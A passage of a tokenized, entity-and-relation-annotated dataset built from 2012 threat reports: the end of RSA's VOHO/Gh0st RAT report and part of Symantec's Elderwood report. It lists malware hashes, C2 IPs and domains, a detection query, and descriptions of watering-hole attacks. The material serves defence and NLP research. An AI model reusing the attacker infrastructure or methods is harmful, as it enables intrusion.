"gh0st", "RAT", "communication", "using", "the", "unmodified", "source", "code", "can", "be", "detected", "by", "looking", "for", "non", "-", "RFC", "compliant", "network", "traffic", "on", "allowed", "paths", ",", "which", "contain", "the", "string", "\u201c", "Gh0st", "\u201d", "in", "the", "first", "view", "five", "bytes", "of", "the", "packet", "payload", "."], ["Because", "this", "is", "a", "commonly", "used", "tactic", "to", "detect", "Gh0st", "on", "the", "network", ",", "attackers", "often", "change", "this", "string", "to", "avoid", "detection", "."], ["In", "the", "case", "of", "the", "VOHO", "compromise", ",", "this", "indicator", "is", "\u201c", "HTTPS", "\u201d", "."], ["Known", "Malicious", "MD5", "Hashes", "03db29c71b0031af08081f5e2f7dcdf2"], ["644161889f0f60885b2a0eec12038b66"], ["e6b43c299a9a1f5abd9be2b729e54577"], ["2fe340fe2574ae540bd98bd9af8ec67d", "RSA", "NetWitness", "Indicators", "ip.dst", "=", "58.64.155.59,58.64.155.57,58.64.143.245,64.26.174.74", "||", "alias.host", "=", "www.wsdhealthy.com", ",", "usc", "-", "data.suroot.com", ",", "usa", "-", "mail.scieron.com", ",", "dll.freshdns.org"], ["Additionally", ",", "the", "following", "feeds", "and", "parsers", "from", "RSA", "NetWitness", "Live", "service", "can", "be", "used", "for", "additional", "Gh0st", "RAT", "detection", "."], ["Gh0st", "parser", "APT", "-", "domains", "feed", "APT", "-", "IPs", "feed", "Conclusions", "RSA", "FirstWatch", "research", "has", "revealed", "an", "exploit", "and", "compromise", "campaign", "with", "connections", "over", "the", "past", "8", "months", "."], ["The", "collected", "data", "suggests", "that", "this", "attack", "was", "orchestrated", "and", "carried", "out", "by", "threat", "actors", "commonly", "referred", "to", "in", "the", "industry", "as", "\u201c", "APT", "\u201d", ":", "1", ")", "2", ")", "3", ")", "4", ")", "5", ")", "6", ")", "Use", "of", "the", "\u201c", "xKungFoo", "\u201d", "script", "kit", "for", "victim", "redirection"], ["Use", "of", "attack", "methodology", "that", "matches", "motives", "seen", "in", "past", "APT", "attacks", "\u2013"], ["most", "notably", "such", "as", "those", "seen", "in", "the", "Aurora", "and", "GhostNet", "campaigns", "Use", "of", "the", "\u201c", "gh0st", "\u201d", "remote", "access", "tool", "(", "RAT", ")", "in", "this", "and", "previous", "campaigns", "Use", "of", "command", "and", "control", "infrastructure", "in", "the", "Hong", "Kong", "area", "in", "this", "and", "previous", "campaigns", "Gross", "impact", "and", "on", "almost", "900", "unique", "organizations", "Targets", "of", "Interest", "and", "Opportunity", "being", "geographically", "disperse", "in", "addition", "to", "industrial", "&", "vertical", "diverse", "with", "a", "heavy", "concentration", "in", "the", "following", "areas", ":", "\u2022", "International", "finance", "&", "banking", "\u2022"], ["Technology", "\u2022"], ["Government", "\u2013", "municipal", ",", "state", ",", "federal", "and", "international", "\u2022", "Utilities", "&", "energy", "\u2022", "Educational", "\u2022", "Defense", "Industrial", "Base", "(", "DIB", ")"], ["\u2022", "Corporate", "Enterprise", "The", "possibility", "exists", "that", "this", "was", "intentional", "misdirection", "on", "the", "part", "of", "the", "attackers", "in", "regards", "to", "their", "origin", "."], ["However", ",", "the", "RSA", "FirstWatch", "team", "believes", "the", "data", "supports", "our", "analysis", "and", "this", "is", "further", "evidence", "of", "APT", "intrusion", "into", "United", "States", "government", "and", "corporate", "assets", "."], ["21", "Disclaimer", "RSA", "Security", "LLC", "(", "\u201c", "RSA", "\u201d", ")", "believes", "the", "information", "in", "this", "publication", "is", "accurate", "as", "of", "its", "publication", "date", "."], ["RSA", "disclaims", "any", "obligation", "to", "update", "after", "the", "date", "hereof", "."], ["The", "information", "is", "subject", "to", "update", "without", "notice", "."], ["The", "analysis", "may", "include", "technical", "or", "other", "inaccuracies", "and/or", "typographical", "errors", "."], ["THE", "INFORMATION", "IN", "THIS", "PUBLICATION", "IS", "PROVIDED", "TO", "FOR", "INFORMATIONAL", "PURPOSES", "ONLY", ",", "IS", "PROVIDED", "\"", "AS", "IS", ",", "\"", "AND", "SHALL", "NOT", "BE", "CONSIDERED", "PRODUCT", "DOCUMENTATION", "OR", "SPECIFICATIONS", "UNDER", "THE", "TERMS", "OF", "ANY", "LICENSE", "OR", "SIMILAR", "AGREEMENT", "."], ["RSA", "MAKES", "NO", "REPRESENTATIONS", "OR", "WARRANTIES", "OF", "ANY", "KIND", "WITH", "RESPECT", "TO", "THE", "INFORMATION", "IN", "THIS", "PUBLICATION", ",", "AND", "SPECIFICALLY", "DISCLAIMS", "IMPLIED", "WARRANTIES", "OF", "MERCHANTABILITY", "OR", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "."], ["i", "http://www.wired.com/threatlevel/2010/01/operation-aurora/"], ["http://www.scribd.com/doc/13731776/Tracking-GhostNet-Investigating-a-Cyber-EspionageNetwork", "iii", "http://googleonlinesecurity.blogspot.com/2012/06/security-warnings-for-suspected-state.html", "iv", "http://contagiodump.blogspot.com/2011/02/targeted-attacks-against-personal.html", "v", "http://thediplomat.com/flashpoints-blog/2011/06/07/china-cyber-attack-fallacies/", "vi"], ["http://www.yunsec.net/a/school/bdzs/fmuma/2010/0602/4175.html"], ["vii"], ["http://www.yunsec.net/a/school/bdzs/fmuma/2010/0602/4175.html", "viii", "http://www.zdnet.com/blog/security/state-sponsored-attackers-using-ie-zero-day-to-hijack-gmailaccounts/12462"], ["ix"], ["http://www.mcafee.com/us/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf", "x", "http://www.malwaredomainlist.com/mdl.php?search=wsdhealthy.com&colsearch=All&quantity=50", "xi", "http://www.mywot.com/en/scorecard/wsdhealthy.com", "xii"], ["http://www.malwaregroup.com/domains/details/wsdhealthy.com", "ii", "ABOUT", "RSA", "RSA", ",", "The", "Security", "Division", "of", "EMC", ",", "is", "the", "premier", "provider", "of", "security", ",", "risk", "and", "compliance", "management", "solutions", "for", "business", "acceleration", "."], ["RSA", "helps", "the", "world", "\u2019s", "leading", "organizations", "succeed", "by", "solving", "their", "most", "complex", "and", "sensitive", "security", "challenges", "."], ["These", "challenges", "include", "managing", "organizational", "risk", ",", "safeguarding", "mobile", "access", "and", "collaboration", ",", "proving", "compliance", ",", "and", "securing", "virtual", "and", "cloud", "environments", "."], ["Combining", "business", "-", "critical", "controls", "in", "identity", "assurance", ",", "encryption", "&", "key", "management", ",", "SIEM", ",", "Data", "Loss", "Prevention", "and", "Fraud", "Protection", "with", "industry", "leading", "eGRC", "capabilities", "and", "robust", "consulting", "services", ",", "RSA", "brings", "visibility", "and", "trust", "to", "millions", "of", "user", "identities", ",", "the", "transactions", "that", "they", "perform", "and", "the", "data", "that", "is", "generated", "."], ["For", "more", "information", ",", "please", "visit", "www.RSA.com", "and", "www.EMC.com", "."], ["EMC2", ",", "EMC", ",", "RSA", ",", "FirstWatch", ",", "NetWitness", "and", "the", "RSA", "logo", "are", "registered", "trademarks", "or", "trademarks", "of", "EMC", "Corporation", "in", "the", "United", "States", "and", "other", "countries", "."], ["All", "other", "trademarks", "used", "herein", "are", "the", "property", "of", "their", "respective", "owners", "."], ["\u00a9", "2012", "EMC", "Corporation", "."], ["All", "rights", "reserved", "."], ["Published", "in", "the", "USA", "."], ["www.emc.com/rsa"]]}, {"vertexSet": [[{"name": "2009", "pos": [1, 2], "sent_id": 8, "type": "Time"}], [{"name": "Google", "pos": [3, 4], "sent_id": 8, "type": "Organization"}], [{"name": "Hydraq", "pos": [11, 12], "sent_id": 8, "type": "TrojanHorse"}], [{"name": "Aurora", "pos": [13, 14], "sent_id": 8, "type": "Campaign"}], [{"name": "Symantec", "pos": [0, 1], "sent_id": 10, "type": "Organization"}], [{"name": "zero-day", "pos": [17, 20], "sent_id": 11, "type": "Exploit"}], [{"name": "\u201cwatering hole\u201d attacks", "pos": [37, 42], "sent_id": 11, "type": "Exploit"}], [{"name": "defense supply chain manufacturers", "pos": [15, 19], "sent_id": 12, "type": "ExploitTargetObject"}], [{"name": "nongovernmental organizations", "pos": [23, 25], "sent_id": 12, "type": "ExploitTargetObject"}], [{"name": "IT service providers", "pos": [30, 33], "sent_id": 12, "type": "ExploitTargetObject"}], [{"name": "Elderwood", "pos": [17, 18], "sent_id": 13, "type": "Campaign"}], [{"name": "spear phishing emails", "pos": [4, 7], "sent_id": 16, "type": "Exploit"}], [{"name": "Sykipot", "pos": [15, 16], "sent_id": 17, "type": "Attacker"}], [{"name": "Nitro", "pos": [17, 18], "sent_id": 17, "type": "Attacker"}], [{"name": "Stuxnet", "pos": [21, 22], "sent_id": 17, "type": "Attacker"}], [{"name": "Adobe Flash Player", "pos": [20, 23], "sent_id": 19, "type": "Software"}], [{"name": "Object Type Confusion Remote Code Execution", "pos": [23, 29], "sent_id": 19, "type": "Vulnerability"}], [{"name": "CVE-2012-0779", "pos": [31, 34], "sent_id": 19, "type": "Vulnerability"}], [{"name": "Microsoft Internet Explorer", "pos": [1, 4], "sent_id": 20, "type": "Software"}], [{"name": "Same ID Property Remote Code Execution", "pos": [4, 10], "sent_id": 20, "type": "Vulnerability"}], [{"name": "CVE-2012-1875", "pos": [12, 15], "sent_id": 20, "type": "Vulnerability"}], [{"name": "Microsoft XML", "pos": [1, 3], "sent_id": 21, "type": "Software"}], [{"name": "Core Services Remote Code Execution", "pos": [3, 8], "sent_id": 21, "type": "Vulnerability"}], [{"name": "CVE-2012-1889", "pos": [10, 13], "sent_id": 21, "type": "Vulnerability"}], [{"name": "Adobe Flash Player", "pos": [0, 3], "sent_id": 23, "type": "Software"}], [{"name": "Remote Code Execution", "pos": [3, 6], "sent_id": 23, "type": "Vulnerability"}], [{"name": "CVE-2012-1535", "pos": [8, 11], "sent_id": 23, "type": "Vulnerability"}], [{"name": "early 2010", "pos": [1, 3], "sent_id": 42, "type": "Time"}], [{"name": "Google", "pos": [4, 5], "sent_id": 42, "type": "Organization"}], [{"name": "December 2009", "pos": [7, 9], "sent_id": 43, "type": "Time"}], [{"name": "Hydraq", "pos": [6, 7], "sent_id": 44, "type": "TrojanHorse"}], [{"name": "Aurora", "pos": [12, 13], "sent_id": 44, "type": "TrojanHorse"}], [{"name": "Internet Explorer zero-day", "pos": [20, 25], "sent_id": 44, "type": "Exploit"}], [{"name": "March 2011", "pos": [1, 3], "sent_id": 46, "type": "Time"}], [{"name": "September 2011", "pos": [1, 3], "sent_id": 48, "type": "Time"}], [{"name": "Amnesty International Hong Kong site", "pos": [19, 24], "sent_id": 49, "type": "ExploitTargetObject"}], [{"name": "SQL injection", "pos": [10, 12], "sent_id": 61, "type": "Exploit"}], [{"name": "Elderwood", "pos": [1, 2], "sent_id": 63, "type": "Campaign"}], [{"name": "Elderwood", "pos": [1, 2], "sent_id": 73, "type": "Attacker"}], [{"name": "Taiwan", "pos": [9, 10], "sent_id": 94, "type": "Country"}], [{"name": "Hong Kong", "pos": [11, 13], "sent_id": 94, "type": "Country"}], [{"name": "China", "pos": [14, 15], "sent_id": 94, "type": "Country"}], [{"name": "Finance", "pos": [29, 30], "sent_id": 96, "type": "ExploitTargetObject"}], [{"name": "Energy", "pos": [31, 32], "sent_id": 96, "type": "ExploitTargetObject"}], [{"name": "Education", "pos": [38, 39], "sent_id": 96, "type": "ExploitTargetObject"}], [{"name": "Government", "pos": [41, 42], "sent_id": 96, "type": "ExploitTargetObject"}], [{"name": "iFrame", "pos": [9, 10], "sent_id": 105, "type": "Exploit"}], [{"name": "Shockwave Flash", "pos": [8, 10], "sent_id": 141, "type": "Exploit"}]], "labels": [{"r": "P27", "h": 3, "t": 1, "evidence": [8]}, {"r": "P33", "h": 2, "t": 0, "evidence": [8]}, {"r": "P22", "h": 3, "t": 5, "evidence": [8, 11]}, {"r": "P22", "h": 3, "t": 6, "evidence": [8, 11]}, {"r": "P19", "h": 15, "t": 16, "evidence": [19]}, {"r": "P19", "h": 15, "t": 17, "evidence": [19]}, {"r": "P19", "h": 18, "t": 19, "evidence": [20]}, {"r": "P19", "h": 18, "t": 20, "evidence": [20]}, {"r": "P19", "h": 21, "t": 22, "evidence": [21]}, {"r": "P19", "h": 21, "t": 23, "evidence": [21]}, {"r": "P19", "h": 24, "t": 25, "evidence": [23]}, {"r": "P19", "h": 24, "t": 26, "evidence": [23]}, {"r": "P33", "h": 30, "t": 29, "evidence": [43, 44]}], "title": "201209SymantecElderwood", "sents": [["Security", "Response", "The", "Elderwood", "Project"], ["Gavin", "O\u2019Gorman"], ["Geoff", "McDonald", "Contents", "Overview", ".............................................................", "1", "Background", ".........................................................", "2"], ["Targets", "................................................................", "4"], ["Escalation", "of", "watering", "hole", "attacks", "...................", "6", "Attack", "platform", "...................................................", "8", "Document", "creation", "kit", "..................................", "8"], ["Shared", "SWF", "file", ".............................................", "8"], ["Connecting", "the", "dots", "...........................................", "9", "Conclusion", "........................................................", "10", "Appendix", "...........................................................", "11"], ["Symantec", "protection", "........................................", "12", "Overview"], ["In", "2009", ",", "Google", "was", "attacked", "by", "a", "group", "using", "the", "Hydraq", "(", "Aurora", ")"], ["Trojan", "horse", "."], ["Symantec", "has", "monitored", "this", "group", "\u2019s", "activities", "for", "the", "last", "three", "years", "as", "they", "have", "consistently", "targeted", "a", "number", "of", "industries", "."], ["Interesting", "highlights", "in", "their", "method", "of", "operations", "include", ":", "the", "use", "of", "seemingly", "an", "unlimited", "number", "of", "zero", "-", "day", "exploits", ",", "attacks", "on", "supply", "chain", "manufacturers", "who", "service", "the", "target", "organization", ",", "and", "a", "shift", "to", "\u201c", "watering", "hole", "\u201d", "attacks", "(", "compromising", "certain", "websites", "likely", "to", "be", "visited", "by", "the", "target", "organization", ")", "."], ["The", "targeted", "industry", "sectors", "include", ",", "but", "are", "not", "restricted", "to", ";", "defense", ",", "various", "defense", "supply", "chain", "manufacturers", ",", "human", "rights", "and", "nongovernmental", "organizations", "(", "NGOs", ")", ",", "and", "IT", "service", "providers", "."], ["These", "attackers", "are", "systematic", "and", "re", "-", "use", "components", "of", "an", "infrastructure", "we", "have", "termed", "the", "\u201c", "Elderwood", "platform", "\u201d", "."], ["The", "name", "\u201c", "Elderwood", "\u201d", "comes", "from", "a", "source", "code", "variable", "used", "by", "the", "attackers", "."], ["This", "attack", "platform", "enables", "them", "to", "quickly", "deploy", "zero", "-", "day", "exploits", "."], ["Attacks", "are", "deployed", "through", "spear", "phishing", "emails", "and", "also", ",", "increasingly", ",", "through", "Web", "injections", "in", "watering", "hole", "attacks", "."], ["Although", "there", "are", "other", "attackers", "utilizing", "zero", "-", "day", "exploits", "(", "for", "example", ",", "the", "Sykipot", "or", "Nitro", ",", "or", "even", "Stuxnet", ")", ",", "we", "have", "seen", "no", "other", "group", "use", "so", "many", "."], ["The", "number", "of", "zero", "-", "day", "exploits", "used", "indicates", "access", "to", "a", "high", "level", "of", "technical", "capability", "."], ["Here", "are", "just", "some", "of", "the", "most", "recent", "exploits", "that", "they", "have", "used", ":", "Security", "Response", "The", "Elderwood", "Project", "\u2022", "Adobe", "Flash", "Player", "Object", "Type", "Confusion", "Remote", "Code", "Execution", "Vulnerability", "(", "CVE-2012", "-", "0779", ")"], ["\u2022", "Microsoft", "Internet", "Explorer", "Same", "ID", "Property", "Remote", "Code", "Execution", "Vulnerability", "(", "CVE-2012", "-", "1875", ")"], ["\u2022", "Microsoft", "XML", "Core", "Services", "Remote", "Code", "Execution", "Vulnerability", "(", "CVE-2012", "-", "1889", ")"], ["\u2022"], ["Adobe", "Flash", "Player", "Remote", "Code", "Execution", "Vulnerability", "(", "CVE-2012", "-", "1535", ")"], ["It", "is", "likely", "the", "attackers", "have", "gained", "access", "to", "the", "source", "code", "for", "some", "widely", "used", "applications", ",", "or", "have", "thoroughly", "reverse", "-", "engineered", "the", "compiled", "applications", "in", "order", "to", "discover", "these", "vulnerabilities", "."], ["The", "vulnerabilities", "are", "used", "as", "needed", ",", "often", "within", "close", "succession", "of", "each", "other", "if", "exposure", "of", "any", "of", "the", "vulnerabilities", "is", "imminent", "."], ["The", "scale", "of", "the", "attacks", ",", "in", "terms", "of", "the", "number", "of", "victims", "and", "the", "duration", "of", "the", "attacks", ",", "are", "another", "indication", "of", "the", "resources", "available", "to", "the", "attackers", "."], ["Victims", "are", "attacked", ",", "not", "for", "petty", "crime", "or", "theft", ",", "but", "for", "the", "wholesale", "gathering", "of", "intelligence", "and", "intellectual", "property", "."], ["The", "resources", "required", "to", "identify", "and", "acquire", "useful", "information", "\u2014", "let", "alone", "analyze", "that", "information", "\u2014", "could", "only", "be", "provided", "by", "a", "large", "criminal", "organization", ",", "attackers", "supported", "by", "a", "nation", "state", ",", "or", "a", "nation", "state", "itself", "."], ["Background"], ["Serious", "zero", "-", "day", "vulnerabilities", ",", "which", "are", "exploited", "in", "the", "wild", "and", "affect", "a", "widely", "used", "piece", "of", "software", ",", "are", "relatively", "rare", ";", "there", "were", "approximately", "eight", "in", "2011", "."], ["The", "past", "few", "months", "however", "has", "seen", "four", "such", "zeroday", "vulnerabilities", "actively", "exploited", "in", "the", "wild", "."], ["Two", "of", "the", "zero", "-", "day", "exploits", "were", "in", "Adobe", "Flash", ",", "the", "other", "two", "in", "Internet", "Explorer", "."], ["In", "April", "2012", ",", "we", "identified", "seven", "different", "Trojans", "that", "were", "being", "used", "in", "conjunction", "with", "CVE-2012", "-", "0779", "."], ["Within", "one", "month", ",", "two", "more", "zero", "-", "day", "exploits", "were", "identified", "in", "the", "wild", "."], ["These", "were", "CVE-2012", "-", "1875", "and", "CVE2012", "-", "1889", "."], ["The", "timing", "of", "the", "release", "of", "these", "three", "exploits", "was", "suspicious", "."], ["As", "soon", "as", "one", "had", "been", "identified", ",", "the", "next", "became", "active", "."], ["We", "investigated", "the", "three", "exploits", "and", "found", "connections", "between", "them", "all", "."], ["In", "the", "past", "few", "weeks", ",", "yet", "another", "zero", "-", "day", "exploit", "was", "detected", "in", "the", "wild", ",", "CVE-2012", "-", "1535", "."], ["We", "have", "tied", "this", "zero", "-", "day", "exploit", "back", "to", "all", "the", "others", "."], ["They", "may", "only", "be", "the", "tip", "of", "the", "iceberg", "."], ["In", "early", "2010", ",", "Google", "documented", "an", "attack", "against", "their", "infrastructure", "."], ["They", "stated", "that", "they", "were", "attacked", "in", "December", "2009", "and", "that", "the", "attacks", "originated", "in", "China", "."], ["The", "attackers", "utilized", "a", "Trojan", "called", "Hydraq", ",", "(", "also", "known", "as", "Aurora", ")", ",", "which", "was", "delivered", "using", "an", "Internet", "Explorer", "zero", "-", "day", "exploit", "."], ["We", "believe", "the", "Hydraq", "attack", "and", "the", "recent", "Figure", "1", "attacks", "that", "exploit", "Timeline", "of", "zero", "-", "day", "exploits", "attributable", "to", "the", "one", "group", "the", "vulnerabilities", "outlined", "above", "are", "linked", "."], ["In", "March", "2011", ",", "at", "least", "two", "Adobe"], ["Flash", "zero", "-", "day", "attacks", "were", "utilized", "in", "similar", "attacks", "against", "the", "same", "types", "of", "victims", "."], ["In", "September", "2011", ",", "yet", "another", "Adobe"], ["Flash", "zero", "-", "day", "exploit", "was", "used", "Page", "2", "Security", "Response", "The", "Elderwood", "Project", "to", "attack", "visitors", "to", "the", "Amnesty", "International", "Hong", "Kong", "site", "."], ["The", "very", "same", "website", "was", "again", "compromised", "in", "the", "most", "recent", "set", "of", "attacks", "."], ["Our", "analysis", "shows", "that", "a", "single", "group", "has", "been", "using", "these", "zero", "-", "day", "exploits", ",", "along", "with", "others", "over", "the", "past", "couple", "of", "years", ",", "in", "targeted", "attacks", "against", "individuals", ",", "companies", ",", "governments", ",", "and", "even", "entire", "sectors", "."], ["A", "timeline", "for", "these", "various", "zero", "-", "day", "exploits", "is", "shown", "in", "Figure", "1", "."], ["The", "attacks", "conducted", "by", "this", "group", "are", "carried", "out", "using", "several", "different", "techniques", "."], ["One", "of", "the", "methods", "used", ",", "called", "a", "watering", "hole", "attack", ",", "shown", "in", "figure", "2", ",", "is", "a", "clear", "shift", "in", "their", "method", "of", "operations", "."], ["The", "concept", "of", "the", "attack", "is", "similar", "to", "a", "predator", "waiting", "at", "a", "watering", "hole", "in", "a", "desert", "."], ["The", "predator", "knows", "that", "victims", "will", "eventually", "have", "to", "come", "to", "the", "watering", "hole", ",", "so", "rather", "than", "go", "hunting", ",", "he", "waits", "for", "his", "victims", "to", "come", "to", "him", "."], ["Similarly", ",", "attackers", "find", "a", "Web", "site", "that", "caters", "to", "a", "particular", "audience", "in", "which", "the", "attackers", "are", "interested", "."], ["For", "example", ",", "people", "who", "visit", "the", "Amnesty", "International", "Hong", "Kong", "website", "are", "most"], ["Figure", "2", "Web", "injection", "process", "used", "in", "watering", "hole", "attacks", "likely", "visiting", "because", "they", "are", "interested", "in", "human", "rights", "issues", "in", "Hong", "Kong", "."], ["Having", "identified", "this", "website", ",", "the", "attackers", "hack", "into", "it", "using", "a", "variety", "of", "means", "."], ["For", "example", ",", "the", "site", "may", "be", "vulnerable", "to", "a", "SQL", "injection", ",", "or", "perhaps", "the", "attackers", "compromise", "the", "machine", "of", "an", "individual", "with", "publishing", "rights", "to", "the", "website", "."], ["The", "Page", "3"], ["The", "Elderwood", "Project", "Security", "Response", "attackers", "then", "inject", "an", "exploit", "onto", "public", "pages", "of", "the", "website", "that", "are", "hopefully", "visited", "by", "their", "ultimate", "target", "."], ["Any", "visitor", "susceptible", "to", "the", "exploit", "is", "compromised", "and", "a", "back", "door", "Trojan", "is", "installed", "onto", "their", "computer", "."], ["The", "attacker", "then", "has", "complete", "control", "over", "the", "victim", "\u2019s", "computer", "."], ["Three", "of", "the", "most", "recent", "zero", "-", "day", "exploits", "were", "used", "in", "watering", "hole", "attacks", ",", "an", "indication", "that", "this", "approach", "is", "gaining", "momentum", "."], ["The", "more", "traditional", "technique", "is", "to", "send", "a", "\u201c", "spear", "-", "phishing", "\u201d", "email", ",", "containing", "an", "attachment", ",", "to", "the", "target", "."], ["That", "attachment", "is", "a", "document", "containing", "an", "exploit", "which", ",", "when", "opened", ",", "then", "drops", "a", "Trojan", "onto", "the", "target", "computer", "."], ["This", "works", "if", "the", "exploit", "is", "embeddable", "in", "a", "document", "."], ["If", "not", ",", "then", "an", "alternative", "approach", "is", "to", "host", "the", "exploit", "on", "a", "Web", "server", "and", "then", "email", "the", "target", "with", "a", "link", "to", "that", "Web", "server", "."], ["The", "link", "used", "is", "quite", "unique", ",", "it", "is", "not", "hosted", "on", "a", "common", "Web", "site", ",", "so", "it", "will", "only", "be", "encountered", "by", "the", "chosen", "target", "."], ["When", "the", "target", "clicks", "on", "the", "link", ",", "the", "exploit", "is", "triggered", "and", "a", "back", "door", "is", "installed", "."], ["The", "Elderwood", "gang", "has", "shown", "their", "resourcefulness", "over", "the", "past", "few", "years", "by", "leveraging", "a", "large", "number", "of", "zero", "-", "day", "vulnerabilities", "."], ["The", "full", "list", "of", "vulnerabilities", "is", "shown", "below", "."], ["Table", "1", "Zero", "-", "day", "vulnerabilities", "associated", "with", "the", "Elderwood", "gang"], ["CVE", "BID", "Description", "Application", "2012", "-", "0779", "53395", "Object", "Type", "Confusion", "Remote", "Code", "Execution", "Vulnerability", "Adobe", "Flash", "Player", "2012", "-", "1875", "53847"], ["Same", "ID", "Property", "Remote", "Code", "Execution", "Vulnerability", "Microsoft", "Internet", "Explorer", "2012", "-", "1889", "53934", "Remote", "Code", "Execution", "Vulnerability", "Microsoft", "XML", "Core", "Services", "2012", "-", "1535", "55009", "Remote", "Code", "Execution", "Vulnerability", "Adobe", "Flash", "Player", "2011", "-", "0609", "46860", "'", "SWF", "'", "File", "Remote", "Memory", "Corruption", "Vulnerability", "Adobe", "Flash", "Player", "2011", "-", "0611", "47314", "'", "SWF", "'", "File", "Remote", "Memory", "Corruption", "Vulnerability", "Adobe", "Flash", "Player", "2011", "-", "2110", "48268", "Adobe", "Flash", "Player", "Remote", "Memory", "Corruption", "Vulnerability", "Adobe", "Flash", "Player", "2010", "-", "0249", "37815", "'", "srcElement", "(", ")", "'", "Remote", "Code", "Execution", "Vulnerability", "Internet", "Explorer"], ["We", "have", "analyzed", "four", "of", "the", "most", "recent", "exploits", "(", "CVE-2012", "-", "0779", ",", "CVE-2012", "-", "1875", ",", "CVE-2012", "-", "1889", ",", "and", "CVE-2012", "-", "1535", ")", "and", "their", "associated", "malicious", "documents", ",", "the", "Trojans", ",", "and", "the", "infrastructure", "utilized", "in", "the", "attacks", "."], ["There", "are", "several", "common", "features", "used", "in", "the", "attacks", "."], ["Some", "of", "these", "features", "hint", "at", "the", "potential", "infrastructure", ",", "or", "platform", ",", "developed", "to", "support", "these", "attacks", "."], ["From", "this", "analysis", "we", "have", "identified", "an", "increase", "in", "watering", "hole", "attacks", "by", "this", "group", "and", "developed", "a", "theory", "describing", "the", "possible", "infrastructure", "the", "attackers", "are", "utilizing", "."], ["We", "also", "describe", "the", "various", "targeted", "industry", "sectors", "and", "provide", "evidence", "that", "a", "single", "gang", "is", "most", "likely", "to", "be", "behind", "the", "attacks", "."], ["Targets"], ["The", "targets", "of", "the", "four", "recent", "zero", "-", "day", "exploits", "were", "attacked", "through", "both", "email", "(", "CVE-2012", "-", "0779", "and", "CVE2012", "-", "1535", ")", "and", "Web", "vectors", "(", "CVE-2012", "-", "0779", ",", "CVE-2012", "-", "1875", ",", "and", "CVE-2012", "-", "1889", ")", "."], ["Identifying", "the", "target", "profile", "and", "related", "industry", "to", "which", "the", "target", "belongs", "is", "straight", "forward", "when", "email", "is", "used", "in", "an", "attack", "."], ["Identifying", "the", "profile", "of", "the", "targets", "when", "the", "Web", "is", "used", "as", "the", "attack", "vector", "is", "difficult", "."], ["For", "example", ",", "if", "an", "aeronautical", "website", "was", "compromised", ",", "the", "attackers", "may", "be", "trying", "to", "infect", "visitors", "from", "the", "Defense", "industry", ",", "the", "aeronautical", "company", "employees", "themselves", ",", "or", "perhaps", "visitors", "from", "others", "aeronautical", "companies", "."], ["For", "our", "analysis", ",", "we", "have", "had", "to", "presume", "that", "the", "industry", "sector", "being", "targeted", "is", "the", "same", "as", "that", "of", "the", "watering", "hole", "website", ",", "understanding", "that", "in", "reality", "this", "may", "not", "always", "be", "the", "case", "."], ["Page", "4", "Security", "Response", "The", "Elderwood", "Project", "The", "primary", "targets", "identified", "are", "defense", ",", "or", "more", "precisely", "manufacturers", "that", "are", "in", "the", "defense", "supply", "chain", "."], ["These", "are", "companies", "who", "manufacture", "electronic", "or", "mechanical", "components", "which", "are", "then", "sold", "to", "top", "-", "tier", "defense", "companies", "."], ["The", "attackers", "may", "use", "the", "manufacturers", "as", "a", "stepping", "stone", "to", "gain", "access", "to", "top", "-", "tier", "defense", "contractors", ",", "or", "obtain", "intellectual", "property", "used", "in", "the", "production", "of", "parts", "that", "make", "up", "larger", "products", "produced", "by", "a", "top", "-", "tier", "defense", "company", "."], ["Figure", "3", "Target", "sectors"], ["The", "second", "most", "common", "target", "is", "the", "general", "area", "of", "human", "rights", ",", "or", "Non", "Governmental", "Organizations", "(", "NGOs", ")", "."], ["A", "number", "of", "websites", "generally", "relating", "to", "religion", ",", "Taiwan", ",", "Hong", "Kong", "and", "China", "were", "compromised", "for", "this", "purpose", "."], ["The", "CVE-2012", "-", "1875", "exploit", "is", "almost", "exclusively", "used", "in", "this", "target", "sector", ",", "with", "some", "crossover", "from", "the", "CVE-2012", "-", "1889", "exploit", "."], ["Figure", "4", "Number", "of", "targeted", "companies", "(", "Email", ")", "and", "compromised", "websites", "(", "Web", ")", "per", "exploit", "Page", "5", "Security", "Response", "The", "Elderwood", "Project", "The", "remaining", "target", "sectors", "include", "Finance", ",", "Energy", "(", "Oil", "/", "Gas", ")", ",", "Education", ",", "and", "Government", "."], ["There", "are", "a", "number", "of", "outlier", "victims", ",", "such", "as", "a", "hotel", "jobs", "site", ",", "which", "may", "have", "simply", "been", "targeted", "in", "error", "and", "are", "collateral", "damage", "."], ["The", "vast", "majority", "of", "detections", "are", "in", "the", "United", "States", "."], ["Figure", "5", "shows", "those", "detections", "."], ["Figure", "5"], ["Global", "detections", "of", "files", "used", "in", "the", "past", "year", "by", "the", "Elderwood", "gang", "Escalation", "of", "watering", "hole", "attacks"], ["As", "we", "have", "noted", "earlier", ",", "the", "number", "of", "watering", "hole", "attacks", "have", "been", "on", "the", "increase", "."], ["The", "attacks", "begin", "with", "an", "attacker", "locating", "a", "vulnerability", "on", "a", "chosen", "website", "."], ["This", "vulnerability", "allows", "the", "attacker", "to", "insert", "some", "JavaScript", ",", "or", "HTML", ",", "into", "the", "website", "."], ["That", "piece", "of", "code", "contains", "a", "link", ",", "or", "iFrame", ",", "which", "points", "to", "another", "Web", "page", "that", "actually", "hosts", "exploit", "code", "for", "the", "chosen", "vulnerability", "."], ["When", "a", "user", "connects", "to", "the", "hacked", "website", ",", "they", "are", "automatically", "referred", "to", "the", "malicious", "Web", "page", "which", "exploits", "a", "vulnerability", "allowing", "the", "attacker", "to", "install", "malware", "onto", "the", "victim", "\u2019s", "computer", "."], ["Once", "the", "iFrame", "and", "malicious", "code", "are", "in", "place", "on", "the", "server", ",", "the", "attacker", "does", "not", "need", "to", "do", "anything", "but", "simply", "wait", "for", "victims", "to", "browse", "to", "the", "website", ",", "or", "visit", "the", "watering", "hole", ",", "and", "become", "infected", "."], ["Web", "injection", "attacks", "are", "not", "new", "and", "are", "commonly", "used", "in", "cybercrime", "."], ["The", "difference", "between", "their", "use", "in", "cybercrime", "and", "in", "watering", "hole", "attacks", "is", "down", "to", "the", "choice", "of", "websites", "to", "compromise", "and", "use", "in", "the", "attacks", "."], ["In", "a", "mass", "injection", "attack", ",", "criminals", "will", "indiscriminately", "compromise", "any", "website", "they", "can", ",", "but", "in", "watering", "hole", "attacks", ",", "the", "attackers", "are", "focused", "."], ["They", "choose", "websites", "within", "a", "particular", "sector", "so", "as", "to", "infect", "persons", "of", "interest", "who", "likely", "work", "in", "that", "same", "sector", "and", "are", "likely", "to", "therefore", 